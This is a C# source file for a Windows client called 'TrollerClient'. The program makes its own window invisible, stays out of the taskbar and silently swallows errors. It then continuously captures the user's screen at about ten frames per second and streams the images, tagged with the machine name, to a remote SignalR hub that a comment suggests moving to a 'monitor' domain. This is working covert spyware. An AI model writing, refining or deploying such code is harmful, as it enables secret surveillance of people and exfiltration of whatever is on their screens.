using Microsoft.AspNetCore.SignalR.Client;
using System.Drawing.Imaging;

namespace TrollerClient;

public partial class Form1 : Form
{
    private HubConnection? _connection;
    private System.Windows.Forms.Timer _captureTimer;
    private bool _isStreaming = false;

    public Form1()
    {
        InitializeComponent();
        this.WindowState = FormWindowState.Minimized;
        this.ShowInTaskbar = false;
        this.Opacity = 0;
        this.Hide();

        _captureTimer = new System.Windows.Forms.Timer();
        _captureTimer.Interval = 100; // ~10 fps
        _captureTimer.Tick += CaptureTimer_Tick;

        ConnectToServerAsync();
    }

    private async void ConnectToServerAsync()
    {
        // Replace with actual domain when deployed, e.g. "https://monitor.yourdomain.com/screenHub"
        _connection = new HubConnectionBuilder()
            .WithUrl("http://localhost:5000/screenHub")
            .WithAutomaticReconnect()
            .Build();

        _connection.On<string>("CommandStartStream", (targetId) =>
        {
            // In a real app, you'd check if targetId matches this client's unique ID
            _isStreaming = true;
            _captureTimer.Start();
        });

        _connection.On<string>("CommandStopStream", (targetId) =>
        {
            _isStreaming = false;
            _captureTimer.Stop();
        });

        try
        {
            await _connection.StartAsync();
            // Start streaming immediately for testing, usually wait for command
            _isStreaming = true;
            _captureTimer.Start();
        }
        catch { }
    }

    private async void CaptureTimer_Tick(object? sender, EventArgs e)
    {
        if (!_isStreaming || _connection?.State != HubConnectionState.Connected)
            return;

        try
        {
            var bounds = Screen.PrimaryScreen?.Bounds ?? new Rectangle(0, 0, 1920, 1080);
            using var bitmap = new Bitmap(bounds.Width, bounds.Height);
            using (var g = Graphics.FromImage(bitmap))
            {
                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
            }

            // Scale down to reduce bandwidth (e.g. 1/2 size)
            var scaledWidth = bounds.Width / 2;
            var scaledHeight = bounds.Height / 2;
            using var scaledBitmap = new Bitmap(bitmap, new Size(scaledWidth, scaledHeight));

            using var ms = new MemoryStream();
            scaledBitmap.Save(ms, ImageFormat.Jpeg);
            
            var base64 = Convert.ToBase64String(ms.ToArray());
            
            // Send to Relay
            await _connection.InvokeAsync("SendFrame", Environment.MachineName, base64);
        }
        catch { }
    }
}
